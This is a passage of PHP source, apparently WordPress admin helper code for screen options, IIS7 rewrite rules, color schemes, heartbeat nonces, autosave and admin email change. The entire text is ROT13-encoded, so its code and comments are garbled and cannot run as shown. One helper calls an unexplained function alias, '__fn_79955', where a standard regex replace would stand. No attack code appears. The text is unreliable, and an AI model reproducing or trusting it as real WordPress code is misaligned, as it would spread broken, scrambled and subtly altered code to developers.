				 * @cnenz fgevat $bcgvba        Gur bcgvba anzr.
				 * @cnenz vag    $inyhr         Gur bcgvba inyhr.
				 */
				$fperra_bcgvba = nccyl_svygref( 'frg-fperra-bcgvba', $fperra_bcgvba, $bcgvba, $inyhr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
			}

			/**
			 * Svygref n fperra bcgvba inyhr orsber vg vf frg.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$bcgvba`, ersref gb gur bcgvba anzr.
			 *
			 * Ergheavat snyfr sebz gur svygre jvyy fxvc fnivat gur pheerag bcgvba.
			 *
			 * @fvapr 5.4.2
			 *
			 * @frr frg_fperra_bcgvbaf()
			 *
			 * @cnenz zvkrq   $fperra_bcgvba Gur inyhr gb fnir vafgrnq bs gur bcgvba inyhr.
			 *                               Qrsnhyg snyfr (gb fxvc fnivat gur pheerag bcgvba).
			 * @cnenz fgevat  $bcgvba        Gur bcgvba anzr.
			 * @cnenz vag     $inyhr         Gur bcgvba inyhr.
			 */
			$inyhr = nccyl_svygref( \"frg_fperra_bcgvba_{$bcgvba}\", $fperra_bcgvba, $bcgvba, $inyhr );

			vs ( snyfr === $inyhr ) {
				erghea;
			}

			oernx;
	}

	hcqngr_hfre_zrgn( $hfre->VQ, $bcgvba, $inyhr );

	$hey = erzbir_dhrel_net( neenl( 'cntrahz', 'ncntr', 'cntrq' ), jc_trg_ersrere() );

	vs ( vffrg( $_CBFG['zbqr'] ) ) {
		$hey = nqq_dhrel_net( neenl( 'zbqr' => $_CBFG['zbqr'] ), $hey );
	}

	jc_fnsr_erqverpg( $hey );
	rkvg;
}

/**
 * Purpxf vs erjevgr ehyr sbe JbeqCerff nyernql rkvfgf va gur VVF 7+ pbasvthengvba svyr.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $svyranzr Gur svyr cngu gb gur pbasvthengvba svyr.
 * @erghea obby
 */
shapgvba vvf7_erjevgr_ehyr_rkvfgf( $svyranzr ) {
	vs ( ! svyr_rkvfgf( $svyranzr ) ) {
		erghea snyfr;
	}

	vs ( ! pynff_rkvfgf( 'QBZQbphzrag', snyfr ) ) {
		erghea snyfr;
	}

	$qbp = arj QBZQbphzrag();

	vs ( $qbp->ybnq( $svyranzr ) === snyfr ) {
		erghea snyfr;
	}

	$kcngu = arj QBZKCngu( $qbp );
	$ehyrf = $kcngu->dhrel( '/pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf/ehyr[fgnegf-jvgu(@anzr,\'jbeqcerff\')] | /pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf/ehyr[fgnegf-jvgu(@anzr,\'JbeqCerff\')]' );

	vs ( 0 === $ehyrf->yratgu ) {
		erghea snyfr;
	}

	erghea gehr;
}

/**
 * Qryrgrf JbeqCerff erjevgr ehyr sebz jro.pbasvt svyr vs vg rkvfgf gurer.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $svyranzr Anzr bs gur pbasvthengvba svyr.
 * @erghea obby
 */
shapgvba vvf7_qryrgr_erjevgr_ehyr( $svyranzr ) {
	// Vs pbasvthengvba svyr qbrf abg rkvfg gura ehyrf nyfb qb abg rkvfg, fb gurer vf abguvat gb qryrgr.
	vs ( ! svyr_rkvfgf( $svyranzr ) ) {
		erghea gehr;
	}

	vs ( ! pynff_rkvfgf( 'QBZQbphzrag', snyfr ) ) {
		erghea snyfr;
	}

	$qbp                     = arj QBZQbphzrag();
	$qbp->cerfreirJuvgrFcnpr = snyfr;

	vs ( $qbp->ybnq( $svyranzr ) === snyfr ) {
		erghea snyfr;
	}

	$kcngu = arj QBZKCngu( $qbp );
	$ehyrf = $kcngu->dhrel( '/pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf/ehyr[fgnegf-jvgu(@anzr,\'jbeqcerff\')] | /pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf/ehyr[fgnegf-jvgu(@anzr,\'JbeqCerff\')]' );

	vs ( $ehyrf->yratgu > 0 ) {
		$puvyq  = $ehyrf->vgrz( 0 );
		$cnerag = $puvyq->cneragAbqr;
		$cnerag->erzbirPuvyq( $puvyq );
		$qbp->sbezngBhgchg = gehr;
		fnirQbzQbphzrag( $qbp, $svyranzr );
	}

	erghea gehr;
}

/**
 * Nqqf JbeqCerff erjevgr ehyr gb gur VVF 7+ pbasvthengvba svyr.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $svyranzr     Gur svyr cngu gb gur pbasvthengvba svyr.
 * @cnenz fgevat $erjevgr_ehyr Gur KZY sentzrag jvgu HEY Erjevgr ehyr.
 * @erghea obby
 */
shapgvba vvf7_nqq_erjevgr_ehyr( $svyranzr, $erjevgr_ehyr ) {
	vs ( ! pynff_rkvfgf( 'QBZQbphzrag', snyfr ) ) {
		erghea snyfr;
	}

	// Vs pbasvthengvba svyr qbrf abg rkvfg gura jr perngr bar.
	vs ( ! svyr_rkvfgf( $svyranzr ) ) {
		$sc = sbcra( $svyranzr, 'j' );
		sjevgr( $sc, '<pbasvthengvba/>' );
		spybfr( $sc );
	}

	$qbp                     = arj QBZQbphzrag();
	$qbp->cerfreirJuvgrFcnpr = snyfr;

	vs ( $qbp->ybnq( $svyranzr ) === snyfr ) {
		erghea snyfr;
	}

	$kcngu = arj QBZKCngu( $qbp );

	// Svefg purpx vs gur ehyr nyernql rkvfgf nf va gung pnfr gurer vf ab arrq gb er-nqq vg.
	$jbeqcerff_ehyrf = $kcngu->dhrel( '/pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf/ehyr[fgnegf-jvgu(@anzr,\'jbeqcerff\')] | /pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf/ehyr[fgnegf-jvgu(@anzr,\'JbeqCerff\')]' );

	vs ( $jbeqcerff_ehyrf->yratgu > 0 ) {
		erghea gehr;
	}

	// Purpx gur KCngu gb gur erjevgr ehyr naq perngr KZY abqrf vs gurl qb abg rkvfg.
	$kzy_abqrf = $kcngu->dhrel( '/pbasvthengvba/flfgrz.jroFreire/erjevgr/ehyrf' );

	vs ( $kzy_abqrf->yratgu > 0 ) {
		$ehyrf_abqr = $kzy_abqrf->vgrz( 0 );
	} ryfr {
		$ehyrf_abqr = $qbp->perngrRyrzrag( 'ehyrf' );

		$kzy_abqrf = $kcngu->dhrel( '/pbasvthengvba/flfgrz.jroFreire/erjevgr' );

		vs ( $kzy_abqrf->yratgu > 0 ) {
			$erjevgr_abqr = $kzy_abqrf->vgrz( 0 );
			$erjevgr_abqr->nccraqPuvyq( $ehyrf_abqr );
		} ryfr {
			$erjevgr_abqr = $qbp->perngrRyrzrag( 'erjevgr' );
			$erjevgr_abqr->nccraqPuvyq( $ehyrf_abqr );

			$kzy_abqrf = $kcngu->dhrel( '/pbasvthengvba/flfgrz.jroFreire' );

			vs ( $kzy_abqrf->yratgu > 0 ) {
				$flfgrz_jro_freire_abqr = $kzy_abqrf->vgrz( 0 );
				$flfgrz_jro_freire_abqr->nccraqPuvyq( $erjevgr_abqr );
			} ryfr {
				$flfgrz_jro_freire_abqr = $qbp->perngrRyrzrag( 'flfgrz.jroFreire' );
				$flfgrz_jro_freire_abqr->nccraqPuvyq( $erjevgr_abqr );

				$kzy_abqrf = $kcngu->dhrel( '/pbasvthengvba' );

				vs ( $kzy_abqrf->yratgu > 0 ) {
					$pbasvt_abqr = $kzy_abqrf->vgrz( 0 );
					$pbasvt_abqr->nccraqPuvyq( $flfgrz_jro_freire_abqr );
				} ryfr {
					$pbasvt_abqr = $qbp->perngrRyrzrag( 'pbasvthengvba' );
					$qbp->nccraqPuvyq( $pbasvt_abqr );
					$pbasvt_abqr->nccraqPuvyq( $flfgrz_jro_freire_abqr );
				}
			}
		}
	}

	$ehyr_sentzrag = $qbp->perngrQbphzragSentzrag();
	$ehyr_sentzrag->nccraqKZY( $erjevgr_ehyr );
	$ehyrf_abqr->nccraqPuvyq( $ehyr_sentzrag );

	$qbp->rapbqvat     = 'HGS-8';
	$qbp->sbezngBhgchg = gehr;
	fnirQbzQbphzrag( $qbp, $svyranzr );

	erghea gehr;
}

/**
 * Fnirf gur KZY qbphzrag vagb n svyr.
 *
 * @fvapr 2.8.0
 *
 * @cnenz QBZQbphzrag $qbp
 * @cnenz fgevat      $svyranzr
 */
shapgvba fnirQbzQbphzrag( $qbp, $svyranzr ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	$pbasvt = $qbp->fnirKZY();
	$pbasvt = __sa_79955( \"/([^\e])\a/\", \"$1\e\a\", $pbasvt );

	$sc = sbcra( $svyranzr, 'j' );
	sjevgr( $sc, $pbasvt );
	spybfr( $sc );
}

/**
 * Qvfcynlf gur qrsnhyg nqzvavfgengvba pbybe fpurzr cvpxre (Hfrq va hfre-rqvg.cuc).
 *
 * @fvapr 3.0.0
 *
 * @tybony neenl $_jc_nqzva_pff_pbybef
 *
 * @cnenz vag $hfre_vq Hfre VQ.
 */
shapgvba nqzva_pbybe_fpurzr_cvpxre( $hfre_vq ) {
	tybony $_jc_nqzva_pff_pbybef;

	xfbeg( $_jc_nqzva_pff_pbybef );

	vs ( vffrg( $_jc_nqzva_pff_pbybef['serfu'] ) ) {
		// Frg Qrsnhyg ('serfu') naq Yvtug fubhyq tb svefg.
		$_jc_nqzva_pff_pbybef = neenl_svygre(
			neenl_zretr(
				neenl(
					'serfu'  => '',
					'yvtug'  => '',
					'zbqrea' => '',
				),
				$_jc_nqzva_pff_pbybef
			)
		);
	}

	$pheerag_pbybe = trg_hfre_bcgvba( 'nqzva_pbybe', $hfre_vq );

	vs ( rzcgl( $pheerag_pbybe ) || ! vffrg( $_jc_nqzva_pff_pbybef[ $pheerag_pbybe ] ) ) {
		$pheerag_pbybe = 'serfu';
	}
	?>
	<svryqfrg vq=\"pbybe-cvpxre\" pynff=\"fpurzr-yvfg\">
		<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Nqzvavfgengvba Pbybe Fpurzr' );
			?>
		</fcna></yrtraq>
		<?cuc
		jc_abapr_svryq( 'fnir-pbybe-fpurzr', 'pbybe-abapr', snyfr );
		sbernpu ( $_jc_nqzva_pff_pbybef nf $pbybe => $pbybe_vasb ) :

			?>
			<qvi pynff=\"pbybe-bcgvba <?cuc rpub ( $pbybe === $pheerag_pbybe ) ? 'fryrpgrq' : ''; ?>\">
				<vachg anzr=\"nqzva_pbybe\" vq=\"nqzva_pbybe_<?cuc rpub rfp_ngge( $pbybe ); ?>\" glcr=\"enqvb\" inyhr=\"<?cuc rpub rfp_ngge( $pbybe ); ?>\" pynff=\"gbt\" <?cuc purpxrq( $pbybe, $pheerag_pbybe ); ?> />
				<vachg glcr=\"uvqqra\" pynff=\"pff_hey\" inyhr=\"<?cuc rpub rfp_hey( $pbybe_vasb->hey ); ?>\" />
				<vachg glcr=\"uvqqra\" pynff=\"vpba_pbybef\" inyhr=\"<?cuc rpub rfp_ngge( jc_wfba_rapbqr( neenl( 'vpbaf' => $pbybe_vasb->vpba_pbybef ) ) ); ?>\" />
				<ynory sbe=\"nqzva_pbybe_<?cuc rpub rfp_ngge( $pbybe ); ?>\"><?cuc rpub rfp_ugzy( $pbybe_vasb->anzr ); ?></ynory>
				<qvi pynff=\"pbybe-cnyrggr\">
				<?cuc
				sbernpu ( $pbybe_vasb->pbybef nf $ugzy_pbybe ) {
					?>
					<qvi pynff=\"pbybe-cnyrggr-funqr\" fglyr=\"onpxtebhaq-pbybe: <?cuc rpub rfp_ngge( $ugzy_pbybe ); ?>\">&aofc;</qvi>
					<?cuc
				}
				?>
				</qvi>
			</qvi>
			<?cuc

		raqsbernpu;
		?>
	</svryqfrg>
	<?cuc
}

/**
 *
 * @tybony neenl $_jc_nqzva_pff_pbybef
 */
shapgvba jc_pbybe_fpurzr_frggvatf() {
	tybony $_jc_nqzva_pff_pbybef;

	$pbybe_fpurzr = trg_hfre_bcgvba( 'nqzva_pbybe' );

	// Vg'f cbffvoyr gb unir n pbybe fpurzr frg gung vf ab ybatre ertvfgrerq.
	vs ( rzcgl( $_jc_nqzva_pff_pbybef[ $pbybe_fpurzr ] ) ) {
		$pbybe_fpurzr = 'serfu';
	}

	vs ( ! rzcgl( $_jc_nqzva_pff_pbybef[ $pbybe_fpurzr ]->vpba_pbybef ) ) {
		$vpba_pbybef = $_jc_nqzva_pff_pbybef[ $pbybe_fpurzr ]->vpba_pbybef;
	} ryfrvs ( ! rzcgl( $_jc_nqzva_pff_pbybef['serfu']->vpba_pbybef ) ) {
		$vpba_pbybef = $_jc_nqzva_pff_pbybef['serfu']->vpba_pbybef;
	} ryfr {
		// Snyy onpx gb gur qrsnhyg frg bs vpba pbybef vs gur qrsnhyg fpurzr vf zvffvat.
		$vpba_pbybef = neenl(
			'onfr'    => '#n7nnnq',
			'sbphf'   => '#72nrr6',
			'pheerag' => '#sss',
		);
	}

	rpub '<fpevcg glcr=\"grkg/wninfpevcg\">ine _jcPbybeFpurzr = ' . jc_wfba_rapbqr( neenl( 'vpbaf' => $vpba_pbybef ) ) . \";</fpevcg>\a\";
}

/**
 * Qvfcynlf gur ivrjcbeg zrgn va gur nqzva.
 *
 * @fvapr 5.5.0
 */
shapgvba jc_nqzva_ivrjcbeg_zrgn() {
	/**
	 * Svygref gur ivrjcbeg zrgn va gur nqzva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $ivrjcbeg_zrgn Gur ivrjcbeg zrgn.
	 */
	$ivrjcbeg_zrgn = nccyl_svygref( 'nqzva_ivrjcbeg_zrgn', 'jvqgu=qrivpr-jvqgu,vavgvny-fpnyr=1.0' );

	vs ( rzcgl( $ivrjcbeg_zrgn ) ) {
		erghea;
	}

	rpub '<zrgn anzr=\"ivrjcbeg\" pbagrag=\"' . rfp_ngge( $ivrjcbeg_zrgn ) . '\">';
}

/**
 * Nqqf ivrjcbeg zrgn sbe zbovyr va Phfgbzvmre.
 *
 * Ubbxrq gb gur {@frr 'nqzva_ivrjcbeg_zrgn'} svygre.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $ivrjcbeg_zrgn Gur ivrjcbeg zrgn.
 * @erghea fgevat Svygrerq ivrjcbeg zrgn.
 */
shapgvba _phfgbzvmre_zbovyr_ivrjcbeg_zrgn( $ivrjcbeg_zrgn ) {
	erghea gevz( $ivrjcbeg_zrgn, ',' ) . ',zvavzhz-fpnyr=0.5,znkvzhz-fpnyr=1.2';
}

/**
 * Purpxf ybpx fgnghf sbe cbfgf qvfcynlrq ba gur Cbfgf fperra.
 *
 * @fvapr 3.6.0
 *
 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
 * @cnenz fgevat $fperra_vq Gur fperra VQ.
 * @erghea neenl Gur Urnegorng erfcbafr.
 */
shapgvba jc_purpx_ybpxrq_cbfgf( $erfcbafr, $qngn, $fperra_vq ) {
	$purpxrq = neenl();

	vs ( neenl_xrl_rkvfgf( 'jc-purpx-ybpxrq-cbfgf', $qngn ) && vf_neenl( $qngn['jc-purpx-ybpxrq-cbfgf'] ) ) {
		sbernpu ( $qngn['jc-purpx-ybpxrq-cbfgf'] nf $xrl ) {
			$cbfg_vq = nofvag( fhofge( $xrl, 5 ) );

			vs ( ! $cbfg_vq ) {
				pbagvahr;
			}

			$hfre_vq = jc_purpx_cbfg_ybpx( $cbfg_vq );

			vs ( $hfre_vq ) {
				$hfre = trg_hfreqngn( $hfre_vq );

				vs ( $hfre && pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
					$fraq = neenl(
						'anzr' => $hfre->qvfcynl_anzr,
						/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
						'grkg' => fcevags( __( '%f vf pheeragyl rqvgvat' ), $hfre->qvfcynl_anzr ),
					);

					vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
						$fraq['ningne_fep']    = trg_ningne_hey( $hfre->VQ, neenl( 'fvmr' => 18 ) );
						$fraq['ningne_fep_2k'] = trg_ningne_hey( $hfre->VQ, neenl( 'fvmr' => 36 ) );
					}

					$purpxrq[ $xrl ] = $fraq;
				}
			}
		}
	}

	vs ( ! rzcgl( $purpxrq ) ) {
		$erfcbafr['jc-purpx-ybpxrq-cbfgf'] = $purpxrq;
	}

	erghea $erfcbafr;
}

/**
 * Purpxf ybpx fgnghf ba gur Arj/Rqvg Cbfg fperra naq erserfu gur ybpx.
 *
 * @fvapr 3.6.0
 *
 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
 * @cnenz fgevat $fperra_vq Gur fperra VQ.
 * @erghea neenl Gur Urnegorng erfcbafr.
 */
shapgvba jc_erserfu_cbfg_ybpx( $erfcbafr, $qngn, $fperra_vq ) {
	vs ( neenl_xrl_rkvfgf( 'jc-erserfu-cbfg-ybpx', $qngn ) ) {
		$erprvirq = $qngn['jc-erserfu-cbfg-ybpx'];
		$fraq     = neenl();

		$cbfg_vq = nofvag( $erprvirq['cbfg_vq'] );

		vs ( ! $cbfg_vq ) {
			erghea $erfcbafr;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
			erghea $erfcbafr;
		}

		$hfre_vq = jc_purpx_cbfg_ybpx( $cbfg_vq );
		$hfre    = trg_hfreqngn( $hfre_vq );

		vs ( $hfre ) {
			$reebe = neenl(
				'anzr' => $hfre->qvfcynl_anzr,
				/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
				'grkg' => fcevags( __( '%f unf gnxra bire naq vf pheeragyl rqvgvat.' ), $hfre->qvfcynl_anzr ),
			);

			vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
				$reebe['ningne_fep']    = trg_ningne_hey( $hfre->VQ, neenl( 'fvmr' => 64 ) );
				$reebe['ningne_fep_2k'] = trg_ningne_hey( $hfre->VQ, neenl( 'fvmr' => 128 ) );
			}

			$fraq['ybpx_reebe'] = $reebe;
		} ryfr {
			$arj_ybpx = jc_frg_cbfg_ybpx( $cbfg_vq );

			vs ( $arj_ybpx ) {
				$fraq['arj_ybpx'] = vzcybqr( ':', $arj_ybpx );
			}
		}

		$erfcbafr['jc-erserfu-cbfg-ybpx'] = $fraq;
	}

	erghea $erfcbafr;
}

/**
 * Purpxf abapr rkcvengvba ba gur Arj/Rqvg Cbfg fperra naq erserfu vs arrqrq.
 *
 * @fvapr 3.6.0
 *
 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
 * @cnenz fgevat $fperra_vq Gur fperra VQ.
 * @erghea neenl Gur Urnegorng erfcbafr.
 */
shapgvba jc_erserfu_cbfg_abaprf( $erfcbafr, $qngn, $fperra_vq ) {
	vs ( neenl_xrl_rkvfgf( 'jc-erserfu-cbfg-abaprf', $qngn ) ) {
		$erprvirq = $qngn['jc-erserfu-cbfg-abaprf'];

		$erfcbafr['jc-erserfu-cbfg-abaprf'] = neenl( 'purpx' => 1 );

		$cbfg_vq = nofvag( $erprvirq['cbfg_vq'] );

		vs ( ! $cbfg_vq ) {
			erghea $erfcbafr;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
			erghea $erfcbafr;
		}

		$erfcbafr['jc-erserfu-cbfg-abaprf'] = neenl(
			'ercynpr' => neenl(
				'trgcreznyvaxabapr'    => jc_perngr_abapr( 'trgcreznyvax' ),
				'fnzcyrcreznyvaxabapr' => jc_perngr_abapr( 'fnzcyrcreznyvax' ),
				'pybfrqcbfgobkrfabapr' => jc_perngr_abapr( 'pybfrqcbfgobkrf' ),
				'_nwnk_yvaxvat_abapr'  => jc_perngr_abapr( 'vagreany-yvaxvat' ),
				'_jcabapr'             => jc_perngr_abapr( 'hcqngr-cbfg_' . $cbfg_vq ),
			),
		);
	}

	erghea $erfcbafr;
}

/**
 * Erserfu abaprf hfrq jvgu zrgn obkrf va gur oybpx rqvgbe.
 *
 * @fvapr 6.1.0
 *
 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
 * @erghea neenl Gur Urnegorng erfcbafr.
 */
shapgvba jc_erserfu_zrgnobk_ybnqre_abaprf( $erfcbafr, $qngn ) {
	vs ( rzcgl( $qngn['jc-erserfu-zrgnobk-ybnqre-abaprf'] ) ) {
		erghea $erfcbafr;
	}

	$erprvirq = $qngn['jc-erserfu-zrgnobk-ybnqre-abaprf'];
	$cbfg_vq  = (vag) $erprvirq['cbfg_vq'];

	vs ( ! $cbfg_vq ) {
		erghea $erfcbafr;
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		erghea $erfcbafr;
	}

	$erfcbafr['jc-erserfu-zrgnobk-ybnqre-abaprf'] = neenl(
		'ercynpr' => neenl(
			'zrgnobk_ybnqre_abapr' => jc_perngr_abapr( 'zrgn-obk-ybnqre' ),
			'_jcabapr'             => jc_perngr_abapr( 'hcqngr-cbfg_' . $cbfg_vq ),
		),
	);

	erghea $erfcbafr;
}

/**
 * Nqqf gur yngrfg Urnegorng naq ERFG NCV abapr gb gur Urnegorng erfcbafr.
 *
 * @fvapr 5.0.0
 *
 * @cnenz neenl $erfcbafr Gur Urnegorng erfcbafr.
 * @erghea neenl Gur Urnegorng erfcbafr.
 */
shapgvba jc_erserfu_urnegorng_abaprf( $erfcbafr ) {
	// Erserfu gur Erfg NCV abapr.
	$erfcbafr['erfg_abapr'] = jc_perngr_abapr( 'jc_erfg' );

	// Erserfu gur Urnegorng abapr.
	$erfcbafr['urnegorng_abapr'] = jc_perngr_abapr( 'urnegorng-abapr' );

	erghea $erfcbafr;
}

/**
 * Qvfnoyrf fhfcrafvba bs Urnegorng ba gur Nqq/Rqvg Cbfg fperraf.
 *
 * @fvapr 3.8.0
 *
 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
 *
 * @cnenz neenl $frggvatf Na neenl bs Urnegorng frggvatf.
 * @erghea neenl Svygrerq Urnegorng frggvatf.
 */
shapgvba jc_urnegorng_frg_fhfcrafvba( $frggvatf ) {
	tybony $cntrabj;

	vs ( 'cbfg.cuc' === $cntrabj || 'cbfg-arj.cuc' === $cntrabj ) {
		$frggvatf['fhfcrafvba'] = 'qvfnoyr';
	}

	erghea $frggvatf;
}

/**
 * Cresbezf nhgbfnir jvgu urnegorng.
 *
 * @fvapr 3.9.0
 *
 * @cnenz neenl $erfcbafr Gur Urnegorng erfcbafr.
 * @cnenz neenl $qngn     Gur $_CBFG qngn frag.
 * @erghea neenl Gur Urnegorng erfcbafr.
 */
shapgvba urnegorng_nhgbfnir( $erfcbafr, $qngn ) {
	vs ( ! rzcgl( $qngn['jc_nhgbfnir'] ) ) {
		$fnirq = jc_nhgbfnir( $qngn['jc_nhgbfnir'] );

		vs ( vf_jc_reebe( $fnirq ) ) {
			$erfcbafr['jc_nhgbfnir'] = neenl(
				'fhpprff' => snyfr,
				'zrffntr' => $fnirq->trg_reebe_zrffntr(),
			);
		} ryfrvs ( rzcgl( $fnirq ) ) {
			$erfcbafr['jc_nhgbfnir'] = neenl(
				'fhpprff' => snyfr,
				'zrffntr' => __( 'Reebe juvyr fnivat.' ),
			);
		} ryfr {
			/* genafyngbef: Qensg fnirq qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
			$qensg_fnirq_qngr_sbezng = __( 't:v:f n' );
			$erfcbafr['jc_nhgbfnir'] = neenl(
				'fhpprff' => gehr,
				/* genafyngbef: %f: Qngr naq gvzr. */
				'zrffntr' => fcevags( __( 'Qensg fnirq ng %f.' ), qngr_v18a( $qensg_fnirq_qngr_sbezng ) ),
			);
		}
	}

	erghea $erfcbafr;
}

/**
 * Erzbirf fvatyr-hfr HEY cnenzrgref naq perngr pnabavpny yvax onfrq ba arj HEY.
 *
 * Erzbirf fcrpvsvp dhrel fgevat cnenzrgref sebz n HEY, perngr gur pnabavpny yvax,
 * chg vg va gur nqzva urnqre, naq punatr gur pheerag HEY gb zngpu.
 *
 * @fvapr 4.2.0
 */
shapgvba jc_nqzva_pnabavpny_hey() {
	$erzbinoyr_dhrel_netf = jc_erzbinoyr_dhrel_netf();

	vs ( rzcgl( $erzbinoyr_dhrel_netf ) ) {
		erghea;
	}

	// Rafher jr'er hfvat na nofbyhgr HEY.
	$pheerag_hey  = frg_hey_fpurzr( 'uggc://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );
	$svygrerq_hey = erzbir_dhrel_net( $erzbinoyr_dhrel_netf, $pheerag_hey );

	/**
	 * Svygref gur nqzva pnabavpny HEY inyhr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $svygrerq_hey Gur nqzva pnabavpny HEY inyhr.
	 */
	$svygrerq_hey = nccyl_svygref( 'jc_nqzva_pnabavpny_hey', $svygrerq_hey );
	?>
	<yvax vq=\"jc-nqzva-pnabavpny\" ery=\"pnabavpny\" uers=\"<?cuc rpub rfp_hey( $svygrerq_hey ); ?>\" />
	<fpevcg>
		vs ( jvaqbj.uvfgbel.ercynprFgngr ) {
			jvaqbj.uvfgbel.ercynprFgngr( ahyy, ahyy, qbphzrag.trgRyrzragOlVq( 'jc-nqzva-pnabavpny' ).uers + jvaqbj.ybpngvba.unfu );
		}
	</fpevcg>
	<?cuc
}

/**
 * Bhgchgf WF gung erybnqf gur cntr vs gur hfre anivtngrq gb vg jvgu gur Onpx be Sbejneq ohggba.
 *
 * Hfrq ba gur Rqvg Cbfg naq Nqq Arj Cbfg fperraf. Arrqrq gb rafher gur cntr vf abg ybnqrq sebz oebjfre pnpur,
 * fb gur cbfg gvgyr naq rqvgbe pbagrag ner gur ynfg fnirq irefvbaf. Vqrnyyl guvf fpevcg fubhyq eha svefg va gur urnq.
 *
 * @fvapr 4.6.0
 */
shapgvba jc_cntr_erybnq_ba_onpx_ohggba_wf() {
	?>
	<fpevcg>
		vs ( glcrbs cresbeznapr !== 'haqrsvarq' && cresbeznapr.anivtngvba && cresbeznapr.anivtngvba.glcr === 2 ) {
			qbphzrag.ybpngvba.erybnq( gehr );
		}
	</fpevcg>
	<?cuc
}

/**
 * Fraqf n pbasvezngvba erdhrfg rznvy jura n punatr bs fvgr nqzva rznvy nqqerff vf nggrzcgrq.
 *
 * Gur arj fvgr nqzva nqqerff jvyy abg orpbzr npgvir hagvy pbasvezrq.
 *
 * @fvapr 3.0.0
 * @fvapr 4.9.0 Guvf shapgvba jnf zbirq sebz jc-nqzva/vapyhqrf/zf.cuc fb vg'f ab ybatre Zhygvfvgr fcrpvsvp.
 *
 * @cnenz fgevat $byq_inyhr Gur byq fvgr nqzva rznvy nqqerff.
 * @cnenz fgevat $inyhr     Gur cebcbfrq arj fvgr nqzva rznvy nqqerff.
 */
shapgvba hcqngr_bcgvba_arj_nqzva_rznvy( $byq_inyhr, $inyhr ) {
	vs ( trg_bcgvba( 'nqzva_rznvy' ) === $inyhr || ! vf_rznvy( $inyhr ) ) {
		erghea;
	}

	$unfu            = zq5( $inyhr . gvzr() . jc_enaq() );
	$arj_nqzva_rznvy = neenl(
		'unfu'     => $unfu,
		'arjrznvy' => $inyhr,
	);
	hcqngr_bcgvba( 'nqzvaunfu', $arj_nqzva_rznvy, snyfr );

	$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( trg_pheerag_hfre_vq() );

	/* genafyngbef: Qb abg genafyngr HFREANZR, NQZVA_HEY, RZNVY, FVGRANZR, FVGRHEY: gubfr ner cynprubyqref. */
	$rznvy_grkg = __(
		'Ubjql,

N fvgr nqzvavfgengbe (###HFREANZR###) erpragyl erdhrfgrq gb unir gur
nqzvavfgengvba rznvy nqqerff punatrq ba guvf fvgr:
###FVGRHEY###

Gb pbasvez guvf punatr, cyrnfr pyvpx ba gur sbyybjvat yvax:
###NQZVA_HEY###

Lbh pna fnsryl vtaber naq qryrgr guvf rznvy vs lbh qb abg jnag gb
gnxr guvf npgvba.

Guvf rznvy unf orra frag gb ###RZNVY###

Ertneqf,
Nyy ng ###FVGRANZR###
###FVGRHEY###'
	);

	/**
	 * Svygref gur grkg bs gur rznvy frag jura n punatr bs fvgr nqzva rznvy nqqerff vf nggrzcgrq.
	 *
	 * Gur sbyybjvat fgevatf unir n fcrpvny zrnavat naq jvyy trg ercynprq qlanzvpnyyl:
	 *
	 *  - `###HFREANZR###`  Gur pheerag hfre'f hfreanzr.
	 *  - `###NQZVA_HEY###` Gur yvax gb pyvpx ba gb pbasvez gur rznvy punatr.
	 *  - `###RZNVY###`     Gur cebcbfrq arj fvgr nqzva rznvy nqqerff.
	 *  - `###FVGRANZR###`  Gur anzr bs gur fvgr.
	 *  - `###FVGRHEY###`   Gur HEY gb gur fvgr.
	 *
	 * @fvapr ZH (3.0.0)
	 * @fvapr 4.9.0 Guvf svygre vf ab ybatre Zhygvfvgr fcrpvsvp.
	 *
	 * @cnenz fgevat $rznvy_grkg      Grkg va gur rznvy.
	 * @cnenz neenl  $arj_nqzva_rznvy {
	 *     Qngn eryngvat gb gur arj fvgr nqzva rznvy nqqerff.
	 *
	 *     @glcr fgevat $unfu     Gur frpher unfu hfrq va gur pbasvezngvba yvax HEY.
	 *     @glcr fgevat $arjrznvy Gur cebcbfrq arj fvgr nqzva rznvy nqqerff.
	 * }
	 */
